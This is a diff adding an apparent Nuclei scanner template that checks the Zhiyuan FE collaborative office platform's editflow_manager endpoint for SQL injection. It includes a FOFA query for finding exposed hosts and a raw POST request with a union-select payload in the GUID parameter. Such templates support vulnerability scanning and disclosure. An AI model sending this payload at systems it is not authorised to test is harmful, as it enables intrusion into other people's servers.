@@ -1,0 +1,31 @@
+id: zhiyuan-FE-editflow_manager-sqli
+
+info:
+  name: 致远互联FE协作办公平台editflow_manager存在sql注入漏洞
+  author: changge
+  severity: info
+  description: 致远互联FE协作办公平台editflow_manager存在sql注入漏洞
+  metadata:
+    fofa-query: title="FE协作办公平台" || body="li_plugins_download"
+  reference:
+    - https://
+  tags: tags
+
+http:
+  - raw:
+      - |-
+        POST /sysform/003/editflow_manager.js%70 HTTP/1.1
+        Host: {{Hostname}}
+        User-Agent: Mozilla/5.0 (Macintosh; Intel Mac OS X 10_14_3) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/12.0.3 Safari/605.1.15
+        Connection: close
+        Content-Length: 41
+        Content-Type: application/x-www-form-urlencoded
+        Accept-Encoding: gzip
+
+        option=2&GUID=-1'+union+select+111*222--+
+
+    matchers-condition: and
+    matchers:
+      - type: dsl
+        dsl:
+          - "status_code == 200 && contains(body,'24642')"
